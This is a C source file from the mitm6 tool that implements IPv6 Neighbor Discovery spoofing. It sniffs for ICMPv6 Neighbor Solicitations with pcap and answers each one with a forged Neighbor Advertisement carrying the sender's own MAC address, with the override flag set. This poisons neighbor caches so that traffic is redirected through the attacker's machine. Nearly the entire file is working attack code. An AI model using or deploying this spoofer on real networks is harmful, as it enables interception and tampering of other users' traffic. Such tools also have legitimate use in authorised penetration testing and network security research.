/*
 * Copyright (c) Rocco Folino
 *
 * This file is part of mitm6.
 *
 * Mitm6 is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Mitm6 is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with mitm6.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <arpa/inet.h>
#include <string.h>
#include <pcap.h>

#include "mitm6.h"
#include "thc-ipv6.h"

extern char *iface;
extern pcap_t *pcap;

static u_char *mac = NULL;

static void proc(u_char *user, const struct pcap_pkthdr *header, const u_char *bytes)
{
        u_char *buf = (u_char *)bytes;
        u_char *packet = NULL;
        int buflen = 0;
        u_char icmp_data[24];

        if (header->len == 0 || bytes == NULL)
                return;

        /* Skip truncated packets */
        if (header->len > CAP_SNAPLEN) {
                debug("captured truncated packet [pkt-len: %d, snaplen: %d], skipping...",
                      header->len, CAP_SNAPLEN);
                return;
        }

        if (buf[54] == ICMP6_NEIGHBORSOL) {

                packet = thc_create_ipv6(iface, PREFER_LINK, &buflen, buf + 62, buf + 22, 255, 0, 0, 0, 0);
                if (packet == NULL) {
                        fatal("IPv6 packet not created");
                        return;
                }
                
                bzero(icmp_data, sizeof(icmp_data));
                memcpy(icmp_data, buf + 62, 16);
                icmp_data[16] = 2;
                icmp_data[17] = 1;
                memcpy(icmp_data + 18, mac, 6);

                if (thc_add_icmp6(packet, &buflen, ICMP6_NEIGHBORADV, 0, ICMP6_NEIGHBORADV_OVERRIDE | ICMP6_NEIGHBORADV_SOLICIT, 
                                  icmp_data, sizeof(icmp_data), 0) < 0) {
                        fatal("ICMPv6 header not appended");
                        return;
                }

                thc_generate_and_send_pkt(iface, mac, buf + 6, packet, &buflen);
                packet = thc_destroy_packet(packet);
        }
}

void start_ndp_spoof()
{
        mac = thc_get_own_mac(iface);
        if (mac == NULL)
                fatal("unable to get own mac address for %s iface", iface);

        printf("Starting spoofer...(Press Control-C to end)\n");
        
        /* Start sniffing */
        pcap_loop(pcap, 0, &proc, NULL);
}

void stop_ndp_spoof()
{
        if (mac != NULL) {
                free(mac);
                mac = NULL;
        }

        pcap_breakloop(pcap);
}
